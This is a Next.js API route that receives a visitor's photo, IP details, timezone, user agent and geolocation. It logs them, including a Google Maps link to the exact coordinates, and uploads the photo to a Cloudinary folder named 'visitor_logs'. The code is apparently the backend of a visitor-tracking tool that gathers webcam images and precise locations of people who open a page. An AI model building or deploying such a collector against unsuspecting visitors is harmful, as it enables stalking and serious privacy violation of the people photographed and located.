import { NextRequest, NextResponse } from 'next/server';
import { v2 as cloudinary } from 'cloudinary';

// Cloudinary Config
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { photo, ipInfo, timezone, userAgent, location } = body;

  console.log('🚨 API hit: /api/log-photo');
  console.log('🧠 IP Info:', ipInfo);
  console.log('🕐 Timezone:', timezone);
  console.log('🧠 User-Agent:', userAgent);

  if (location) {
    console.log('📍 Location:', location);
    console.log(
      `🗺️ Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
    );
  } else {
    console.log('📍 Location: Not available or denied');
  }

  // Upload image to Cloudinary
  try {
    const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');

    const uploadRes = await cloudinary.uploader.upload(
      `data:image/jpeg;base64,${base64Data}`,
      {
        folder: 'visitor_logs',
        public_id: `visitor_${Date.now()}`,
      }
    );

    console.log(`✅ Uploaded to Cloudinary: ${uploadRes.secure_url}`);

    return NextResponse.json({
      status: 'logged',
      imageUrl: uploadRes.secure_url,
    });
  } catch (err) {
    console.error('❌ Cloudinary upload failed:', err);
    return NextResponse.json({ status: 'error', message: 'Upload failed' }, { status: 500 });
  }
}